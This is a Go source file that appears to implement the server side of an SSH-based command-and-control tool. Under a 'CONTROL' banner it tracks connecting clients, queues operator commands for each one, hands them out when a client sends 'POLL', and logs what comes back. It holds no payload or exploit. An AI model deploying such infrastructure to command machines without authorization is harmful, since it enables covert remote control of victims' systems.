package server

import (
	"fmt"
	"net"
	"strings"

	"github.com/gliderlabs/ssh"
)

type CommandClient struct {
	RemoteAddr net.Addr
	buffer     []string
	commands   []string
}

func (c *CommandClient) GetBuffer() []string {
	return c.buffer
}

func (c *CommandClient) GetCommand() []string {
	return c.commands
}

func (c *CommandClient) AddCommands(cmds ...string) []string {
	c.commands = append(c.commands, cmds...)
	return c.commands
}

type CommandServer struct {
	Clients       []*CommandClient
	CurrentClient *CommandClient
	Update        chan bool
	sshServer     *ssh.Server
}

func (cs *CommandServer) connectionHandler(ctx ssh.Context, conn net.Conn) net.Conn {
	client := &CommandClient{
		RemoteAddr: conn.RemoteAddr(),
	}
	client.buffer = []string{
		"\033[33m",
		"	██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗       ",
		"	██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║      ",
		"	██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║      ",
		"	██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║      ",
		"	╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗ ",
		"	 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ",
		"\033[0m",
	}
	client.buffer = append(client.buffer, fmt.Sprint("\033[32m[+]\033[0m Connection from ", conn.RemoteAddr()))
	cs.Clients = append(cs.Clients, client)
	cs.CurrentClient = client

	cs.Update <- true
	return conn
}

func (cs *CommandServer) handler(s ssh.Session) {
	// Figure out which client pinged us
	activeClient := cs.CurrentClient
	for _, client := range cs.Clients {
		if client.RemoteAddr == s.RemoteAddr() {
			activeClient = client
		}
	}
	if strings.TrimSpace(s.RawCommand()) == "POLL" {
		if len(activeClient.commands) > 0 {
			cmd := activeClient.commands[0]
			s.Write([]byte(cmd))
			if len(activeClient.commands) == 1 {
				activeClient.commands = []string{}
			} else {
				activeClient.commands = activeClient.commands[1:]
			}

			prompt := s.User() + "@" + s.RemoteAddr().String() + ": "
			activeClient.buffer = append(activeClient.buffer, fmt.Sprint("\033[36m", prompt, "\033[0m", cmd))
		}
	} else {
		activeClient.buffer = append(activeClient.buffer, s.RawCommand())
	}

	cs.Update <- true
}

func (cs *CommandServer) Start() error {
	cs.Clients = []*CommandClient{}
	cs.Update = make(chan bool, 200)
	cs.sshServer = &ssh.Server{Addr: ":2222", Handler: cs.handler}
	if err := cs.sshServer.SetOption(ssh.WrapConn(cs.connectionHandler)); err != nil {
		return err
	}

	return cs.sshServer.ListenAndServe()
}
